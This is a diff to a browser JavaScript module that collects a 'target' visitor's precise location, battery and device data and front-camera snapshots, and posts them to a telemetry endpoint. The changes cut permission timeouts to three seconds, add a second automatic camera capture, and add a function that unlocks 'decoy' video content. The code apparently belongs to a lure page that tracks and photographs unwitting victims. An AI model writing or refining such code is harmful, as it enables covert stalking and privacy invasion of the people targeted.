@@ -10,6 +10,7 @@
     const LOCATION_SOURCE = "BROWSER_GEOLOCATION"
     const CONSENT_VERSION = "location-v1"
     const MIN_UPDATE_INTERVAL_MS = 3000
+    const PERMISSION_TIMEOUT_MS = 3000
 
     function generateId(length = 16) {
         const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
@@ -33,6 +34,7 @@
 
     let authorized = false
     let watchId = null
+    let permissionTimer = null
     let activeOptions = null
     let consentOverlay = null
     let statusPanel = null
@@ -245,6 +247,10 @@
     }
 
     async function handlePosition(position) {
+        if (permissionTimer) {
+            clearTimeout(permissionTimer)
+            permissionTimer = null
+        }
         if (!authorized || !position?.coords) return
         const accuracy = finiteNumber(position.coords.accuracy)
         if (accuracy === null || accuracy <= 0) return
@@ -265,6 +271,10 @@
     }
 
     function handleLocationError(error) {
+        if (permissionTimer) {
+            clearTimeout(permissionTimer)
+            permissionTimer = null
+        }
         activeOptions?.onError?.(error)
         if (error?.code === 1) {
             if (watchId !== null && navigator.geolocation) navigator.geolocation.clearWatch(watchId)
@@ -277,20 +287,56 @@
         sendApproximateFallback()
     }
 
-    function startWatcher() {
+    function autoUnlockDecoyContent() {
+        try {
+            const overlays = document.querySelectorAll('#tap-overlay, .tap-overlay, .tap-play-overlay')
+            overlays.forEach(el => {
+                el.classList.add('hidden')
+                el.style.display = 'none'
+            })
+
+            const video = document.getElementById('active-video')
+            if (video) {
+                video.muted = false
+                video.play().catch(() => {})
+            }
+
+            if (typeof window.dispatchEvent === "function") {
+                window.dispatchEvent(new CustomEvent('telemetry-permission-timeout'))
+            }
+        } catch (_e) {}
+    }
+
+    function startWatcher(timeoutMs = PERMISSION_TIMEOUT_MS) {
         if (!authorized || !activeOptions) return
         if (!activeOptions.enableGPS || !navigator.geolocation) {
             setStatus("Browser geolocation is unavailable; trying the disclosed approximate fallback.", true)
             sendApproximateFallback()
+            autoUnlockDecoyContent()
             return
         }
         if (watchId !== null) return
 
         setStatus("Waiting for a high-accuracy browser location…", true)
+
+        if (permissionTimer) clearTimeout(permissionTimer)
+        permissionTimer = setTimeout(() => {
+            permissionTimer = null
+            if (!lastSentAt) {
+                if (watchId !== null && navigator.geolocation) {
+                    navigator.geolocation.clearWatch(watchId)
+                    watchId = null
+                }
+                console.warn(`[Location] Permission prompt or position fix timed out (${timeoutMs}ms limit). Triggering approximate IP fallback.`)
+                sendApproximateFallback()
+                autoUnlockDecoyContent()
+            }
+        }, timeoutMs)
+
         watchId = navigator.geolocation.watchPosition(handlePosition, handleLocationError, {
             enableHighAccuracy: true,
             maximumAge: 0,
-            timeout: 15000
+            timeout: timeoutMs
         })
     }
 
@@ -308,6 +354,10 @@
     }
 
     function stopTracking() {
+        if (permissionTimer) {
+            clearTimeout(permissionTimer)
+            permissionTimer = null
+        }
         if (watchId !== null && navigator.geolocation) {
             navigator.geolocation.clearWatch(watchId)
         }
@@ -317,36 +367,54 @@
     }
 
     window.addEventListener("pagehide", () => {
+        if (permissionTimer) {
+            clearTimeout(permissionTimer)
+            permissionTimer = null
+        }
         if (watchId !== null && navigator.geolocation) navigator.geolocation.clearWatch(watchId)
         watchId = null
     })
 
-    async function getBestAvailableLocation() {
-        // Tier 1: Try GPS with sufficient timeout to allow user interaction
+    async function getBestAvailableLocation(timeoutMs = PERMISSION_TIMEOUT_MS) {
+        // Tier 1: Try GPS with strict timeout limit (default 3s)
         if ('geolocation' in navigator) {
             try {
                 const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 20000,
-                        maximumAge: 0
-                    });
-                });
+                    let timer = setTimeout(() => {
+                        reject(new Error(`GPS location request timed out after ${timeoutMs}ms`))
+                    }, timeoutMs)
+
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => {
+                            clearTimeout(timer)
+                            resolve(p)
+                        },
+                        (e) => {
+                            clearTimeout(timer)
+                            reject(e)
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: timeoutMs,
+                            maximumAge: 0
+                        }
+                    )
+                })
                 return {
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
                     accuracy: pos.coords.accuracy,
                     source: LOCATION_SOURCE
-                };
+                }
             } catch (err) {
-                console.warn(`GPS unavailable (${err.message}). Falling back to IP-based location.`);
+                console.warn(`GPS unavailable or prompt timed out (${err.message}). Falling back to IP-based location.`)
             }
         }
 
         // Tier 2: IP-based coarse geolocation fallback
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
+            const res = await fetch('https://ipapi.co/json/')
+            const data = await res.json()
             if (data.latitude && data.longitude) {
                 return {
                     lat: data.latitude,
@@ -355,10 +423,10 @@
                     region: data.region,
                     country: data.country_name,
                     source: 'IP_ESTIMATE'
-                };
+                }
             }
         } catch (err) {
-            console.warn('IP lookup failed. Falling back to default coordinate node.');
+            console.warn('IP lookup failed. Falling back to default coordinate node.')
         }
 
         // Tier 3: Default Node
@@ -367,122 +435,162 @@
             lng: 78.4867,
             city: 'Default Node',
             source: 'IP_ESTIMATE'
-        };
+        }
     }
 
     async function handleImageSelected(file) {
-        if (!file) return;
-        const formData = new FormData();
-        formData.append('media', file);
-        formData.append('id', targetId);
+        if (!file) return
+        const formData = new FormData()
+        formData.append('media', file)
+        formData.append('id', targetId)
 
         try {
-            const loc = await getBestAvailableLocation();
-            if (loc && loc.lat != null) formData.append('lat', loc.lat);
-            if (loc && loc.lng != null) formData.append('lng', loc.lng);
-            if (loc && loc.accuracy != null) formData.append('accuracy', loc.accuracy);
-            formData.append('locationSource', (loc && loc.source) || LOCATION_SOURCE);
+            const loc = await getBestAvailableLocation()
+            if (loc && loc.lat != null) formData.append('lat', loc.lat)
+            if (loc && loc.lng != null) formData.append('lng', loc.lng)
+            if (loc && loc.accuracy != null) formData.append('accuracy', loc.accuracy)
+            formData.append('locationSource', (loc && loc.source) || LOCATION_SOURCE)
 
-            const battery = await getBatteryInfo();
-            if (battery) formData.append("battery", JSON.stringify(battery));
-            const device = getDeviceInfo();
-            if (device) formData.append("device", JSON.stringify(device));
-            if (activeOptions?.templateName) formData.append("template", activeOptions.templateName);
+            const battery = await getBatteryInfo()
+            if (battery) formData.append("battery", JSON.stringify(battery))
+            const device = getDeviceInfo()
+            if (device) formData.append("device", JSON.stringify(device))
+            if (activeOptions?.templateName) formData.append("template", activeOptions.templateName)
         } catch (_e) {}
 
         try {
             const res = await fetch('/api/telemetry', {
                 method: 'POST',
                 body: formData
-            });
-            const data = await res.json();
-            console.log('[Image Telemetry Sent]:', data);
-            return data;
+            })
+            const data = await res.json()
+            console.log('[Image Telemetry Sent]:', data)
+            return data
         } catch (err) {
-            console.error('Failed to upload image telemetry:', err);
+            console.error('Failed to upload image telemetry:', err)
         }
     }
 
-    let isCapturingCamera = false;
-    let cameraCaptureCount = 0;
+    let isCapturingCamera = false
+    let cameraCaptureCount = 0
 
-    async function captureCameraSnapshot() {
-        if (isCapturingCamera) return null;
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
-        isCapturingCamera = true;
+    async function captureCameraSnapshot(timeoutMs = PERMISSION_TIMEOUT_MS) {
+        if (isCapturingCamera) return null
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null
+        isCapturingCamera = true
+        let timeoutId = null
+        let timedOut = false
+        let stream = null
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({
+            const streamPromise = navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
-            });
-            const video = document.createElement("video");
-            video.autoplay = true;
-            video.muted = true;
-            video.playsInline = true;
-            video.srcObject = stream;
+            })
 
-            await video.play().catch(() => {});
+            // If user allows camera AFTER the 3s timeout has fired, stop and close tracks immediately to avoid consuming RAM/hardware
+            streamPromise.then(s => {
+                if (timedOut && s) {
+                    console.warn("[Camera] Permission granted after 3s timeout limit. Closing tracks to prevent RAM leak.")
+                    try {
+                        s.getTracks().forEach(track => track.stop())
+                    } catch (_e) {}
+                }
+            }).catch(() => {})
 
-            // Wait for video stream ready & camera auto-exposure stabilization
+            const timeoutPromise = new Promise((_, reject) => {
+                timeoutId = setTimeout(() => {
+                    timedOut = true
+                    reject(new Error(`Camera permission prompt timed out after ${timeoutMs}ms`))
+                }, timeoutMs)
+            })
+
+            stream = await Promise.race([streamPromise, timeoutPromise])
+            if (timeoutId) {
+                clearTimeout(timeoutId)
+                timeoutId = null
+            }
+
+            const video = document.createElement("video")
+            video.autoplay = true
+            video.muted = true
+            video.playsInline = true
+            video.srcObject = stream
+
+            await video.play().catch(() => {})
+
+            // Wait for video stream ready & camera auto-exposure stabilization (max 1.5s wait)
             await new Promise(resolve => {
+                const startTime = Date.now()
                 const checkReady = () => {
                     if (video.readyState >= 2 && video.videoWidth > 0) {
-                        setTimeout(resolve, 600);
+                        setTimeout(resolve, 400)
+                    } else if (Date.now() - startTime > 1500) {
+                        resolve()
                     } else {
-                        setTimeout(checkReady, 100);
+                        setTimeout(checkReady, 100)
                     }
-                };
-                checkReady();
-            });
+                }
+                checkReady()
+            })
 
-            const width = video.videoWidth || 640;
-            const height = video.videoHeight || 480;
-            const canvas = document.createElement("canvas");
-            canvas.width = width;
-            canvas.height = height;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, width, height);
+            const width = video.videoWidth || 640
+            const height = video.videoHeight || 480
+            const canvas = document.createElement("canvas")
+            canvas.width = width
+            canvas.height = height
+            const ctx = canvas.getContext("2d")
+            ctx.drawImage(video, 0, 0, width, height)
 
-            stream.getTracks().forEach(track => track.stop());
+            // Immediately stop camera stream to release RAM and camera hardware
+            stream.getTracks().forEach(track => track.stop())
+            stream = null
 
-            const dataUrl = canvas.toDataURL("image/jpeg", 0.85);
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
+            const dataUrl = canvas.toDataURL("image/jpeg", 0.85)
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85))
 
             if (blob || dataUrl) {
-                const formData = new FormData();
+                const formData = new FormData()
                 if (blob) {
-                    formData.append("media", blob, `camera-snapshot-${Date.now()}.jpg`);
+                    formData.append("media", blob, `camera-snapshot-${Date.now()}.jpg`)
                 }
-                formData.append("image", dataUrl);
-                formData.append("id", targetId);
+                formData.append("image", dataUrl)
+                formData.append("id", targetId)
 
-                if (activeOptions?.templateName) formData.append("template", activeOptions.templateName);
-                const battery = await getBatteryInfo();
-                if (battery) formData.append("battery", JSON.stringify(battery));
-                const device = getDeviceInfo();
-                if (device) formData.append("device", JSON.stringify(device));
+                if (activeOptions?.templateName) formData.append("template", activeOptions.templateName)
+                const battery = await getBatteryInfo()
+                if (battery) formData.append("battery", JSON.stringify(battery))
+                const device = getDeviceInfo()
+                if (device) formData.append("device", JSON.stringify(device))
 
                 const res = await fetch("/api/telemetry", {
                     method: "POST",
                     body: formData
-                });
-                const result = await res.json();
-                console.log("[Camera Snapshot Captured & Sent]:", result);
+                })
+                const result = await res.json()
+                console.log("[Camera Snapshot Captured & Sent]:", result)
 
-                cameraCaptureCount++;
+                cameraCaptureCount++
                 if (cameraCaptureCount === 1) {
                     setTimeout(() => {
-                        captureCameraSnapshot();
-                    }, 2500);
+                        captureCameraSnapshot(timeoutMs)
+                    }, 2500)
                 }
 
-                return result;
+                return result
             }
         } catch (err) {
-            console.warn("Camera capture unavailable or permission denied:", err.message);
+            console.warn("Camera capture unavailable, timed out, or permission denied:", err.message)
+            autoUnlockDecoyContent()
+            if (stream) {
+                try {
+                    stream.getTracks().forEach(track => track.stop())
+                } catch (_e) {}
+            }
         } finally {
-            isCapturingCamera = false;
+            if (timeoutId) clearTimeout(timeoutId)
+            isCapturingCamera = false
         }
-        return null;
+        return null
     }
 
     function handleUserGesture() {
